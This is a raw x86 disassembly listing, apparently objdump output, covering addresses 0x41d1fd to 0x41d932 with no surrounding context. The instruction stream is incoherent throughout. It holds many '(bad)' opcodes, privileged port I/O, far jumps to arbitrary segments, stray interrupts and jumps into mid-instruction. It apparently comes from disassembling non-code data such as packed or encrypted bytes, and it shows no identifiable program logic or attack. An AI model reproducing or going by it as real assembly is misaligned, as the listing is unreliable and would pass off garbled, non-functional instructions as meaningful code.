  41d1fd:	jp     0x41d236
  41d1ff:	push   0x7c235437
  41d204:	mov    dl,0x4a
  41d206:	fild   WORD PTR [edi]
  41d208:	mov    ds:0x3727845d,al
  41d20d:	in     eax,0x8b
  41d20f:	jl     0x41d203
  41d211:	jge    0x41d1c4
  41d213:	(bad)  
  41d214:	aad    0x12
  41d216:	rcr    BYTE PTR [eax+eiz*4+0x62],1
  41d21a:	and    eax,0x5ecf89e0
  41d21f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d220:	jnp    0x41d22a
  41d222:	jecxz  0x41d259
  41d224:	(bad)  
  41d225:	shl    DWORD PTR [edi+0x6d755387],cl
  41d22b:	push   esi
  41d22c:	mov    cl,0xfa
  41d22e:	pushf  
  41d22f:	jmp    0xbcad:0x6d40a09d
  41d236:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d237:	shr    DWORD PTR [esi-0x4f3d7268],1
  41d23d:	sub    eax,0x78148501
  41d242:	test   DWORD PTR [esi+eax*2],esi
  41d245:	xchg   esp,eax
  41d246:	fwait
  41d247:	mov    BYTE PTR [ebx+0x1fa46e6d],cl
  41d24d:	xchg   esi,eax
  41d24e:	ds and dl,bh
  41d251:	xchg   ebx,eax
  41d252:	das    
  41d253:	popf   
  41d254:	inc    esi
  41d255:	and    al,0x92
  41d257:	mov    cl,0xb
  41d259:	push   eax
  41d25a:	std    
  41d25b:	outs   dx,BYTE PTR ds:[esi]
  41d25c:	adc    DWORD PTR [esi],edi
  41d25e:	retf   
  41d25f:	jmp    0x3284:0x5499e47a
  41d266:	aaa    
  41d267:	mov    al,0x1b
  41d269:	push   ss
  41d26a:	ja     0x41d268
  41d26c:	retf   
  41d26d:	add    ah,BYTE PTR [edx-0x6f]
  41d270:	or     BYTE PTR [ecx+edx*1+0x7e],0xf2
  41d275:	(bad)  
  41d276:	iret   
  41d277:	scas   al,BYTE PTR es:[edi]
  41d278:	nop
  41d279:	mov    esi,0x66a07ba0
  41d27e:	mov    WORD PTR [esi],es
  41d280:	jne    0x41d248
  41d282:	repnz pop esi
  41d284:	fwait
  41d285:	pop    esp
  41d286:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d287:	ror    BYTE PTR [ebp-0x42],1
  41d28a:	bound  ecx,QWORD PTR [ecx-0x327416b2]
  41d290:	fsub   QWORD PTR [eax-0x7875a58d]
  41d296:	xor    BYTE PTR [eax],ch
  41d298:	imul   ecx,DWORD PTR [esp+0x4a],0xffffffc8
  41d29d:	push   esi
  41d29e:	lea    ebp,fs:[ebp+0x79]
  41d2a2:	adc    eax,0x4eddadf
  41d2a7:	cmc    
  41d2a8:	idiv   al
  41d2aa:	mov    dh,dh
  41d2ac:	loopne 0x41d287
  41d2ae:	(bad)  
  41d2af:	mov    eax,0x7bace8f3
  41d2b4:	or     DWORD PTR [esi+0x197372ce],esp
  41d2ba:	and    esp,DWORD PTR [eax-0x4dad5d2b]
  41d2c0:	imul   edx,DWORD PTR [edx+0x14],0xffffff9f
  41d2c4:	jmp    0x41d25a
  41d2c6:	cmp    cl,BYTE PTR [ebp-0x57]
  41d2c9:	jl     0x41d2de
  41d2cb:	in     al,dx
  41d2cc:	stos   DWORD PTR es:[edi],eax
  41d2cd:	cmp    al,0x6d
  41d2cf:	adc    al,BYTE PTR [edi]
  41d2d1:	addr16 jp 0x41d33f
  41d2d4:	jne    0x41d30b
  41d2d6:	jne    0x41d302
  41d2d8:	adc    ah,dh
  41d2da:	js     0x41d358
  41d2dc:	and    dl,BYTE PTR [ebx-0x7ae64717]
  41d2e2:	(bad)
  41d2e6:	lods   al,BYTE PTR ds:[esi]
  41d2e7:	int    0x43
  41d2e9:	test   eax,0x91dc37c7
  41d2ee:	sbb    DWORD PTR [ebx-0x63],edi
  41d2f1:	xchg   ebx,eax
  41d2f2:	rcl    BYTE PTR [edi+0x40],cl
  41d2f5:	(bad)  
  41d2f6:	clc    
  41d2f7:	mov    esp,0xc0d64fea
  41d2fc:	dec    edi
  41d2fd:	xchg   esp,eax
  41d2fe:	ja     0x41d296
  41d300:	cmp    eax,0x71aaf60a
  41d305:	mov    eax,0xe6897724
  41d30a:	sbb    DWORD PTR [eax-0x61],edi
  41d30d:	lds    ecx,FWORD PTR [ecx-0x5a28e16b]
  41d313:	sub    dl,dh
  41d315:	ss fwait
  41d317:	mov    edx,fs
  41d319:	add    DWORD PTR [edx-0x492113e5],eax
  41d31f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d320:	mov    edx,0x8e3c9650
  41d325:	nop
  41d326:	xchg   ebp,eax
  41d327:	jbe    0x41d362
  41d329:	xchg   edx,edx
  41d32b:	adc    dh,BYTE PTR [ecx+0x1a]
  41d32e:	pop    ebx
  41d32f:	stos   DWORD PTR es:[edi],eax
  41d330:	stos   BYTE PTR es:[edi],al
  41d331:	stos   BYTE PTR es:[edi],al
  41d332:	jg     0x41d37c
  41d334:	xor    al,0x70
  41d336:	ret    
  41d337:	and    cl,BYTE PTR [edx-0x7d4625c]
  41d33d:	cmp    al,0x79
  41d33f:	out    dx,eax
  41d340:	je     0x41d385
  41d342:	sbb    esp,DWORD PTR [ecx+eiz*8]
  41d345:	imul   DWORD PTR [esi+0x4c]
  41d348:	sub    eax,0x3a367ccf
  41d34d:	scas   eax,DWORD PTR es:[edi]
  41d34e:	push   0xffffffdf
  41d350:	adc    al,0x64
  41d352:	leave  
  41d353:	jecxz  0x41d31e
  41d355:	xchg   esp,eax
  41d356:	inc    esi
  41d357:	xor    al,0x56
  41d359:	xchg   ebx,eax
  41d35a:	or     eax,0x4f0f45d1
  41d35f:	fdivr  QWORD PTR [eax+ecx*4+0x6]
  41d363:	dec    eax
  41d364:	lods   eax,DWORD PTR ds:[esi]
  41d365:	test   BYTE PTR [ecx],dl
  41d367:	mov    bh,0x91
  41d369:	mov    ds:0x228381bb,al
  41d36e:	pop    ebp
  41d36f:	push   esp
  41d370:	xchg   edi,eax
  41d371:	loopne 0x41d310
  41d373:	rol    dl,cl
  41d375:	sahf   
  41d376:	stos   DWORD PTR es:[edi],eax
  41d377:	pop    esp
  41d378:	scas   al,BYTE PTR es:[edi]
  41d379:	aam    0xb7
  41d37b:	mov    BYTE PTR [ecx+0x61],0xdb
  41d37f:	lea    edi,[ecx]
  41d381:	popf   
  41d382:	bound  ecx,QWORD PTR [edi]
  41d384:	pop    eax
  41d385:	mov    al,0x50
  41d387:	cdq    
  41d388:	add    al,0xe7
  41d38a:	sub    ebx,DWORD PTR [ebp+edx*2-0x5f2aeda7]
  41d391:	idiv   BYTE PTR [esi-0xa]
  41d394:	inc    edi
  41d395:	inc    edi
  41d396:	adc    DWORD PTR [edi-0x3be3edbd],0xffffff8b
  41d39d:	(bad)  
  41d39e:	clc    
  41d39f:	jg     0x41d36d
  41d3a1:	mov    ebx,fs
  41d3a3:	jnp    0x41d41d
  41d3a5:	jnp    0x41d407
  41d3a7:	and    BYTE PTR [esp+edi*8],bh
  41d3aa:	pop    ebp
  41d3ab:	mov    ecx,0x21b8a8c2
  41d3b0:	test   al,0x30
  41d3b2:	mov    ecx,gs
  41d3b4:	retf   0x4187
  41d3b7:	lds    ecx,FWORD PTR [edi-0x7a79bfe0]
  41d3bd:	in     al,0xbe
  41d3bf:	inc    ebx
  41d3c0:	outs   dx,BYTE PTR ds:[esi]
  41d3c1:	xor    BYTE PTR [eax],cl
  41d3c3:	cmp    al,BYTE PTR [ebp+0x62]
  41d3c6:	cmc    
  41d3c7:	ror    DWORD PTR [edx+0xf038245],cl
  41d3cd:	xchg   ecx,eax
  41d3ce:	xchg   ebp,eax
  41d3cf:	xchg   DWORD PTR [edi],ebp
  41d3d1:	lea    eax,[esp+eiz*4]
  41d3d4:	sub    dl,BYTE PTR [esi]
  41d3d6:	fstp   TBYTE PTR cs:[edx+0x66]
  41d3da:	jecxz  0x41d3bc
  41d3dc:	sub    al,bh
  41d3de:	add    DWORD PTR [ebp+0x1cdb9ee8],ebp
  41d3e4:	adc    BYTE PTR [edi+ebp*8],ch
  41d3e7:	sbb    cl,BYTE PTR [ecx-0x6b]
  41d3ea:	or     ah,BYTE PTR [edi]
  41d3ec:	int    0xf3
  41d3ee:	and    bl,cl
  41d3f0:	in     eax,dx
  41d3f1:	scas   eax,DWORD PTR es:[edi]
  41d3f2:	mov    esi,0xf1287591
  41d3f7:	les    ecx,FWORD PTR [ecx]
  41d3f9:	icebp  
  41d3fa:	clc    
  41d3fb:	adc    edx,DWORD PTR [ebp+0x33]
  41d3fe:	aas    
  41d3ff:	fnsave gs:[esi+0x58705eb9]
  41d406:	(bad)  
  41d407:	pop    ss
  41d408:	jp     0x41d3a9
  41d40a:	push   ds
  41d40b:	int    0x99
  41d40d:	cmp    eax,0x55884cc
  41d412:	sub    eax,0x5370e3b5
  41d417:	push   ecx
  41d418:	les    ebx,FWORD PTR ds:0xddd5642d
  41d41e:	sbb    eax,DWORD PTR [eax]
  41d420:	lea    esp,[eax-0xf0fb7ed]
  41d426:	mov    ah,0xdd
  41d428:	xchg   esi,eax
  41d429:	call   DWORD PTR [edx+0x5]
  41d42c:	sub    eax,0x2c7e5969
  41d431:	jbe    0x41d463
  41d433:	jmp    0xc6f5:0x2a84afdc
  41d43a:	int3   
  41d43b:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  41d43d:	(bad)  
  41d43f:	adc    DWORD PTR [esi-0x103d2f9f],edx
  41d445:	pop    ecx
  41d446:	mov    edi,0x1bc5483e
  41d44b:	(bad)  
  41d44c:	cmp    eax,0x6b834326
  41d451:	dec    ebx
  41d452:	test   al,0xae
  41d454:	and    ch,BYTE PTR [eax]
  41d456:	adc    ah,BYTE PTR [edx+edi*4]
  41d459:	not    BYTE PTR [ecx+0x3c]
  41d45c:	add    al,0xfd
  41d45e:	jb     0x41d456
  41d460:	sbb    dh,BYTE PTR [esi]
  41d462:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d463:	sub    DWORD PTR [edi+0x3e668b18],ebp
  41d469:	call   0xd54e277f
  41d46e:	xchg   DWORD PTR [edx+0x58b224f7],ebp
  41d474:	test   BYTE PTR [edx],ah
  41d476:	std    
  41d477:	ja     0x41d488
  41d479:	sbb    eax,0x607ab180
  41d47e:	jp     0x41d493
  41d480:	cld    
  41d481:	neg    BYTE PTR [ecx]
  41d483:	dec    esp
  41d484:	xchg   ebx,eax
  41d485:	mov    WORD PTR [ebp-0xb],ss
  41d488:	in     eax,dx
  41d489:	scas   eax,DWORD PTR es:[edi]
  41d48a:	cmp    al,0xd1
  41d48c:	in     al,dx
  41d48d:	or     DWORD PTR ds:0x2c8b7c7f,eax
  41d493:	mov    edi,0xe2d675ae
  41d498:	(bad)  
  41d499:	iret   
  41d49a:	mov    ecx,0xbda8e4f4
  41d49f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d4a0:	sub    esi,ebp
  41d4a2:	cdq    
  41d4a3:	jns    0x41d48e
  41d4a5:	add    BYTE PTR [ecx-0x22c79391],ch
  41d4ab:	fild   QWORD PTR [edi+0x620c13a4]
  41d4b1:	jge    0x41d4db
  41d4b3:	mov    bh,0xa0
  41d4b5:	push   ss
  41d4b6:	out    dx,eax
  41d4b7:	adc    al,0xed
  41d4b9:	pop    ds
  41d4ba:	cli    
  41d4bb:	dec    ebx
  41d4bc:	inc    eax
  41d4bd:	add    edx,DWORD PTR [ebx+0x5c]
  41d4c0:	cmp    al,0xa1
  41d4c2:	or     esp,ecx
  41d4c4:	icebp  
  41d4c5:	stos   BYTE PTR es:[edi],al
  41d4c6:	sub    al,0xaa
  41d4c8:	jo     0x41d504
  41d4ca:	push   es
  41d4cb:	mov    edi,DWORD PTR [edx-0x7b]
  41d4ce:	xchg   esp,eax
  41d4cf:	jbe    0x41d4a9
  41d4d1:	aad    0x9d
  41d4d3:	pushf  
  41d4d4:	daa    
  41d4d5:	xchg   ecx,eax
  41d4d6:	jae    0x41d48a
  41d4d8:	cmc    
  41d4d9:	push   ebp
  41d4da:	jmp    0xa46e275a
  41d4df:	and    al,0x82
  41d4e1:	dec    esi
  41d4e2:	xchg   ecx,eax
  41d4e3:	retf   
  41d4e4:	mov    dh,0x43
  41d4e6:	jne    0x41d4b5
  41d4e8:	pop    ebx
  41d4e9:	mov    cl,0xa7
  41d4eb:	aam    0xf
  41d4ed:	cmp    eax,0x98d6efea
  41d4f2:	or     ebx,esp
  41d4f4:	in     al,dx
  41d4f5:	sub    eax,0x3e3388e7
  41d4fa:	add    al,0xcc
  41d4fc:	iret   
  41d4fd:	add    bl,bh
  41d4ff:	hlt    
  41d500:	mov    ds:0x56d20eaf,eax
  41d505:	dec    eax
  41d506:	out    dx,al
  41d507:	lods   al,BYTE PTR ds:[esi]
  41d508:	sbb    ah,ch
  41d50a:	aad    0x29
  41d50c:	mov    ah,0x6d
  41d50e:	mov    al,ds:0xd3268bd
  41d513:	int    0x4b
  41d515:	test   al,0xae
  41d517:	add    cl,BYTE PTR [edx+eiz*8+0x20]
  41d51b:	ds jmp 0x41d4f1
  41d51e:	push   cs
  41d51f:	into   
  41d520:	jmp    0x6887f06a
  41d525:	or     eax,0xcd750678
  41d52a:	(bad)  
  41d52b:	pop    ebx
  41d52c:	or     dh,bh
  41d52e:	ins    DWORD PTR es:[edi],dx
  41d52f:	ins    DWORD PTR es:[edi],dx
  41d530:	dec    ecx
  41d531:	xor    BYTE PTR ds:0xd63b8ab2,dl
  41d537:	imul   esp,ebx,0x25b4bda6
  41d53d:	dec    ebx
  41d53e:	cmp    ch,dl
  41d540:	cmovb  edx,DWORD PTR [eax]
  41d543:	push   es
  41d544:	sbb    eax,0x50e6c84a
  41d549:	ins    DWORD PTR es:[edi],dx
  41d54a:	pop    es
  41d54b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d54c:	and    DWORD PTR [ebp+0x20],edi
  41d54f:	out    dx,al
  41d550:	mov    bh,0x45
  41d552:	in     eax,dx
  41d553:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d554:	mov    ds:0x8d03fefb,eax
  41d559:	jo     0x41d54a
  41d55b:	mov    ebx,0xc3fc3ba1
  41d560:	add    BYTE PTR [edi+0x72],bl
  41d563:	imul   edi,DWORD PTR [eax-0x1a],0xa0889f09
  41d56a:	push   eax
  41d56b:	mov    ebx,0x38c51ffd
  41d570:	xor    bh,al
  41d572:	or     al,0x5
  41d574:	jg     0x41d547
  41d576:	xor    eax,DWORD PTR [ebp-0x649d4a81]
  41d57c:	xchg   dl,ah
  41d57e:	stos   BYTE PTR es:[edi],al
  41d57f:	in     al,0xa7
  41d581:	aas    
  41d582:	jne    0x41d542
  41d584:	xchg   esp,eax
  41d585:	(bad)  
  41d586:	call   0x4101bc39
  41d58b:	or     BYTE PTR [esi+0x1a],dl
  41d58e:	mov    WORD PTR [eax],?
  41d590:	xlat   BYTE PTR ds:[ebx]
  41d591:	bound  eax,QWORD PTR ds:0x7394fd67
  41d597:	add    esi,DWORD PTR [ecx]
  41d599:	pop    edi
  41d59a:	mov    eax,0xa4e6d75e
  41d59f:	sbb    al,0xd
  41d5a1:	mov    ah,0x32
  41d5a3:	xchg   edx,eax
  41d5a4:	pushf  
  41d5a5:	push   cs
  41d5a6:	das    
  41d5a7:	fisttp WORD PTR [ebp-0x58]
  41d5aa:	jmp    0xfe4b334c
  41d5af:	fistp  DWORD PTR [edi+0x2bbd446c]
  41d5b5:	inc    eax
  41d5b6:	cli    
  41d5b7:	scas   al,BYTE PTR es:[edi]
  41d5b8:	retf   0xa13a
  41d5bb:	fwait
  41d5bc:	inc    ecx
  41d5bd:	fst    DWORD PTR [eax+0x5a]
  41d5c0:	ds xchg ebp,eax
  41d5c2:	jp     0x41d554
  41d5c4:	nop
  41d5c5:	inc    edx
  41d5c6:	lea    ecx,[ecx+edi*2-0x61]
  41d5ca:	icebp  
  41d5cb:	push   ebp
  41d5cc:	xchg   esp,eax
  41d5cd:	call   0x28a8487f
  41d5d2:	lea    ecx,ds:0x11cced0c
  41d5d8:	or     al,0x70
  41d5da:	pop    edi
  41d5db:	inc    eax
  41d5dc:	sahf   
  41d5dd:	fisubr DWORD PTR [eax-0x157870cf]
  41d5e3:	jbe    0x41d587
  41d5e5:	lock sbb edi,esi
  41d5e8:	(bad)  
  41d5e9:	out    dx,eax
  41d5ea:	pop    ds
  41d5eb:	cmp    DWORD PTR [ebp-0x4d],0xefc60b45
  41d5f2:	stos   BYTE PTR es:[edi],al
  41d5f3:	mov    bl,0xfa
  41d5f5:	imul   edi,esi,0x57
  41d5f8:	mov    WORD PTR [ebx],ss
  41d5fa:	push   esi
  41d5fb:	inc    ecx
  41d5fc:	add    DWORD PTR [edi],edx
  41d5fe:	pmullw mm1,QWORD PTR [eax+0x3c]
  41d602:	jbe    0x41d5bd
  41d604:	mov    WORD PTR [esi-0x71644649],fs
  41d60a:	push   edi
  41d60b:	inc    edi
  41d60c:	aad    0x45
  41d60e:	loopne 0x41d63d
  41d610:	sub    eax,0x276ad095
  41d615:	add    BYTE PTR [esi],0x57
  41d618:	lods   eax,DWORD PTR ds:[esi]
  41d619:	mov    dl,cl
  41d61b:	jle    0x41d5d7
  41d61d:	mov    edx,0xd685501d
  41d622:	jmp    0x975811af
  41d627:	ret    
  41d628:	addr16 or al,0x26
  41d62b:	inc    ecx
  41d62c:	jecxz  0x41d6a9
  41d62e:	jp     0x41d626
  41d630:	neg    DWORD PTR [ebx-0x17]
  41d633:	pop    ecx
  41d634:	gs sbb bh,bl
  41d637:	mov    eax,ds:0xc4b071c9
  41d63c:	xor    al,0x72
  41d63e:	rcl    DWORD PTR [ebp+ebp*1+0x2b],cl
  41d642:	mov    ah,BYTE PTR [edx-0x5831df3a]
  41d648:	mov    al,dl
  41d64a:	dec    edi
  41d64b:	dec    edi
  41d64c:	sbb    BYTE PTR [edx],al
  41d64e:	(bad)  
  41d64f:	std    
  41d650:	push   0x660ffd1b
  41d655:	cdq    
  41d656:	inc    ecx
  41d657:	jl     0x41d6c2
  41d659:	out    dx,al
  41d65a:	ins    DWORD PTR es:[edi],dx
  41d65b:	cs mov cl,0x7
  41d65e:	lahf   
  41d65f:	pop    ecx
  41d660:	and    ebx,DWORD PTR [esp+eiz*8+0x3d]
  41d664:	add    esi,DWORD PTR [edi-0x7fc1594e]
  41d66a:	xor    eax,0x6e25f6b8
  41d66f:	popa   
  41d670:	sub    ebp,DWORD PTR [ecx-0x71]
  41d673:	xor    al,BYTE PTR [esi]
  41d675:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d676:	scas   eax,DWORD PTR es:[edi]
  41d677:	fwait
  41d678:	and    al,BYTE PTR [edi+0x2a74569]
  41d67e:	jp     0x41d679
  41d680:	sub    DWORD PTR [eax],eax
  41d682:	aas    
  41d683:	(bad)  
  41d684:	jmp    0x41d6d0
  41d686:	sub    eax,0x1c00a36c
  41d68b:	cli    
  41d68c:	cdq    
  41d68d:	ins    DWORD PTR es:[edi],dx
  41d68e:	inc    DWORD PTR [edx]
  41d690:	mov    edi,0x315914e0
  41d695:	enter  0x2776,0xa3
  41d699:	adc    al,0x46
  41d69b:	xor    dl,BYTE PTR [edi+eiz*8+0x40aa8a16]
  41d6a2:	xlat   BYTE PTR ds:[ebx]
  41d6a3:	add    cl,BYTE PTR [eax+0x59]
  41d6a6:	or     eax,0x3fd8997b
  41d6ab:	loopne 0x41d6c7
  41d6ad:	pop    ebp
  41d6ae:	pop    esp
  41d6af:	jmp    0xb13adca4
  41d6b4:	add    ecx,DWORD PTR [esi+ebx*1]
  41d6b7:	push   es
  41d6b8:	mov    ebx,0xdbb696d9
  41d6bd:	cmp    dl,dl
  41d6bf:	mov    DWORD PTR [eax+ebp*4],esi
  41d6c2:	test   BYTE PTR [edx],dl
  41d6c4:	shr    BYTE PTR [eax],1
  41d6c6:	pop    esi
  41d6c7:	or     ebx,DWORD PTR [ebp+0x29]
  41d6ca:	retf   0x413e
  41d6cd:	scas   al,BYTE PTR es:[edi]
  41d6ce:	jbe    0x41d6ed
  41d6d0:	outs   dx,BYTE PTR ds:[esi]
  41d6d1:	sbb    al,0x1f
  41d6d3:	in     al,dx
  41d6d4:	mov    eax,0xf79e586e
  41d6d9:	sub    BYTE PTR [ebp+0x605f52c9],0x4a
  41d6e0:	in     al,dx
  41d6e1:	dec    eax
  41d6e2:	adc    DWORD PTR [ebx-0x55e7c00c],esi
  41d6e8:	(bad)  
  41d6e9:	push   edx
  41d6ea:	or     ah,al
  41d6ec:	sbb    BYTE PTR [ebx+0x68],ah
  41d6ef:	adc    eax,0xf6dee0c5
  41d6f4:	mov    cl,0x2b
  41d6f6:	adc    eax,0x68ccf2f1
  41d6fb:	xchg   esp,eax
  41d6fc:	ss cdq 
  41d6fe:	(bad)  
  41d700:	ins    DWORD PTR es:[edi],dx
  41d701:	mov    al,ds:0x505117c1
  41d706:	ds xchg ebp,eax
  41d708:	fabs   
  41d70a:	jecxz  0x41d760
  41d70c:	push   eax
  41d70d:	int    0x87
  41d70f:	or     BYTE PTR [edx+0x40],0xe0
  41d713:	add    DWORD PTR ds:0xa405485a,0x28
  41d71a:	dec    eax
  41d71b:	fld    QWORD PTR [edx]
  41d71d:	es (bad) 
  41d71f:	mov    ah,0xa3
  41d721:	fcmovb st,st(2)
  41d723:	add    dl,BYTE PTR [edx]
  41d725:	ror    BYTE PTR [esi-0x7],1
  41d728:	gs and ebp,ecx
  41d72b:	and    DWORD PTR gs:[eax+ebp*2],ecx
  41d72f:	in     eax,dx
  41d730:	adc    eax,0x6a49ded
  41d735:	push   0xef84599d
  41d73a:	cmp    esp,DWORD PTR [esi+edx*8]
  41d73d:	fdivr  DWORD PTR [ecx]
  41d73f:	pop    es
  41d740:	jb     0x41d6d0
  41d742:	call   0xeb7b:0xaa719bb6
  41d749:	and    edi,DWORD PTR [edi+0x204789d5]
  41d74f:	push   cs
  41d750:	(bad)  
  41d752:	into   
  41d753:	ds and esi,edx
  41d756:	sbb    esp,DWORD PTR [ebx-0x540b0dd8]
  41d75c:	sbb    al,0x67
  41d75e:	gs and dh,dh
  41d761:	add    BYTE PTR [eax+0x2156f9ce],dh
  41d767:	or     eax,0x34f41805
  41d76c:	mov    dl,0x90
  41d76e:	add    ah,BYTE PTR [esi]
  41d770:	push   0xe8a50248
  41d775:	in     eax,dx
  41d776:	push   ecx
  41d777:	gs xchg edx,eax
  41d779:	push   ecx
  41d77a:	test   edx,ebp
  41d77c:	rcl    cl,cl
  41d77e:	inc    edi
  41d77f:	enter  0xfc0a,0xf0
  41d783:	mov    ds:0x6cece543,al
  41d788:	sbb    DWORD PTR [ecx-0x24],ecx
  41d78b:	or     ebx,DWORD PTR [edi-0x5cb41bc7]
  41d791:	retf   
  41d792:	fld    TBYTE PTR [ecx-0x80]
  41d795:	test   BYTE PTR [edx-0x1d],bh
  41d798:	dec    edi
  41d799:	rcl    BYTE PTR ss:[esi],cl
  41d79c:	stc    
  41d79d:	sbb    DWORD PTR [edx+0x52],eax
  41d7a0:	adc    esp,edi
  41d7a2:	sub    eax,0x44ade1da
  41d7a7:	out    0x97,al
  41d7a9:	mov    bl,0x5
  41d7ab:	shl    BYTE PTR [ebx],0xf5
  41d7ae:	xchg   edi,eax
  41d7af:	shl    BYTE PTR [esp+edx*8],1
  41d7b2:	xchg   ecx,eax
  41d7b3:	sbb    dl,BYTE PTR [ebx+ecx*4+0x5b]
  41d7b7:	es jae 0x41d81f
  41d7ba:	(bad)  
  41d7bb:	clc    
  41d7bc:	cwde   
  41d7bd:	cmp    bl,BYTE PTR [ecx]
  41d7bf:	or     BYTE PTR [ebx+0x74],dh
  41d7c2:	dec    eax
  41d7c3:	cmp    al,0x96
  41d7c5:	stos   BYTE PTR es:[edi],al
  41d7c6:	jl     0x41d822
  41d7c8:	jne    0x41d843
  41d7ca:	mov    esp,0x7ccf2f5a
  41d7cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d7d0:	sbb    cl,BYTE PTR [edx]
  41d7d2:	push   edx
  41d7d3:	fadd   QWORD PTR [esi-0x5a]
  41d7d6:	gs jecxz 0x41d78e
  41d7d9:	push   0xb26c4b60
  41d7de:	push   esi
  41d7df:	in     eax,0x2c
  41d7e1:	mov    bh,0xce
  41d7e3:	add    al,BYTE PTR [ecx+edi*2-0x23]
  41d7e7:	sub    esi,DWORD PTR [ebx-0x49]
  41d7ea:	fiadd  WORD PTR [edx-0x16191e6c]
  41d7f0:	es je  0x41d83b
  41d7f3:	fdiv   QWORD PTR [ebx+0x6c]
  41d7f6:	in     al,0x96
  41d7f8:	aad    0x8e
  41d7fa:	cld    
  41d7fb:	cmp    eax,0x427dfdea
  41d800:	shl    DWORD PTR [eax+0x2a],1
  41d803:	jo     0x41d7a0
  41d805:	mov    eax,ds:0xa2d271b3
  41d80a:	(bad)  
  41d80b:	pinsrw mm0,WORD PTR [eax],0xc5
  41d80f:	mov    cl,0x10
  41d811:	jae    0x41d802
  41d813:	call   0x647e9949
  41d818:	je     0x41d7f6
  41d81a:	push   edx
  41d81b:	mov    bl,0x2b
  41d81d:	data16 xlat BYTE PTR ds:[ebx]
  41d81f:	pop    ebp
  41d820:	or     al,0x15
  41d822:	mov    dl,0xb5
  41d824:	pop    esp
  41d825:	push   edx
  41d826:	fdivr  QWORD PTR [edi-0x742ac20]
  41d82c:	ficomp DWORD PTR [eax-0x68]
  41d82f:	dec    eax
  41d830:	cmp    al,0xe9
  41d832:	push   esi
  41d833:	cld    
  41d834:	xchg   esi,eax
  41d835:	dec    edi
  41d836:	bound  ecx,QWORD PTR [ebx]
  41d838:	pop    edi
  41d839:	in     eax,dx
  41d83a:	dec    eax
  41d83b:	sub    al,0x64
  41d83d:	add    BYTE PTR [esi],bh
  41d83f:	sbb    al,0xc3
  41d841:	inc    ecx
  41d842:	stc    
  41d843:	mov    esi,0x83d82e57
  41d848:	xor    BYTE PTR [ecx],al
  41d84a:	and    ebp,esp
  41d84c:	(bad)  
  41d84d:	into   
  41d84e:	repz ja 0x41d83d
  41d851:	arpl   bp,ax
  41d853:	pop    ebx
  41d854:	mov    esp,0x6bec7bee
  41d859:	adc    DWORD PTR [esi],0xc5077917
  41d85f:	fild   QWORD PTR [eax*1-0x56c735fc]
  41d866:	add    BYTE PTR [ecx],ah
  41d868:	ja     0x41d88e
  41d86a:	inc    ebp
  41d86b:	mov    ebx,0xa4aae45d
  41d870:	jno    0x41d836
  41d872:	test   BYTE PTR [esp+edi*8],dh
  41d875:	call   0x7807f4eb
  41d87a:	pcmpgtd mm2,QWORD PTR [ecx-0x2943d3f6]
  41d881:	mov    al,ds:0x47310c4
  41d886:	icebp  
  41d887:	icebp  
  41d888:	xlat   BYTE PTR ds:[ebx]
  41d889:	dec    edx
  41d88a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d88b:	xor    ebp,DWORD PTR [edi]
  41d88d:	iret   
  41d88e:	xchg   DWORD PTR [edi-0x1ef80ef9],edx
  41d894:	push   edi
  41d895:	mov    bl,0x5a
  41d897:	push   esi
  41d898:	sub    BYTE PTR [edx-0x5b53e039],bl
  41d89e:	xchg   esp,ebp
  41d8a0:	mov    dl,BYTE PTR ds:0x46400fc5
  41d8a6:	mov    esi,0x447cd748
  41d8ab:	(bad)  
  41d8ac:	das    
  41d8ad:	fs stc 
  41d8af:	(bad)  
  41d8b0:	and    eax,0x44e0a918
  41d8b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d8b6:	dec    esi
  41d8b7:	pop    ss
  41d8b8:	int    0xbf
  41d8ba:	dec    esi
  41d8bb:	int3   
  41d8bc:	int3   
  41d8bd:	out    0xb3,al
  41d8bf:	scas   al,BYTE PTR es:[edi]
  41d8c0:	mov    bh,0x97
  41d8c2:	mov    edi,0x173eee01
  41d8c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d8c8:	mov    ebx,0x773ea361
  41d8cd:	and    cl,ah
  41d8cf:	push   ebx
  41d8d0:	xor    BYTE PTR [ecx+0x281e1c69],bl
  41d8d6:	in     eax,0xad
  41d8d8:	repnz ins DWORD PTR es:[edi],dx
  41d8da:	sti    
  41d8db:	ins    BYTE PTR es:[edi],dx
  41d8dc:	addr16 test al,0x67
  41d8df:	add    BYTE PTR [edx-0x2dfa4a79],0x3
  41d8e6:	mov    ebp,0x16aa1138
  41d8eb:	push   ds
  41d8ec:	imul   esp,DWORD PTR [ebx+0x465da8cf],0x33
  41d8f3:	pop    esp
  41d8f4:	std    
  41d8f5:	xor    dl,BYTE PTR [ebp+0x67]
  41d8f8:	nop
  41d8f9:	cmc    
  41d8fa:	sbb    bl,BYTE PTR [edx+ebp*4+0x5ca81b85]
  41d901:	loopne 0x41d8eb
  41d903:	mov    dl,0x4c
  41d905:	cmp    DWORD PTR [eax+0x45],0xffffffd9
  41d909:	outs   dx,BYTE PTR ds:[esi]
  41d90a:	outs   dx,DWORD PTR ds:[esi]
  41d90b:	inc    edx
  41d90c:	stos   DWORD PTR es:[edi],eax
  41d90d:	retf   
  41d90e:	or     eax,0x4228ee02
  41d913:	test   ah,ah
  41d915:	loop   0x41d902
  41d917:	add    al,0x37
  41d919:	push   ebx
  41d91a:	int3   
  41d91b:	out    dx,al
  41d91c:	mov    bl,0x85
  41d91e:	sub    ecx,edx
  41d920:	pop    ebx
  41d921:	xchg   edx,eax
  41d923:	dec    esi
  41d924:	jnp    0x41d8dc
  41d926:	into   
  41d927:	add    ah,bl
  41d929:	push   DWORD PTR [eax-0xfe4b88d]
  41d92f:	dec    ebx
  41d930:	xor    BYTE PTR [edi],dh
  41d932:	mov    gs,WORD PTR [si+0x1a9]
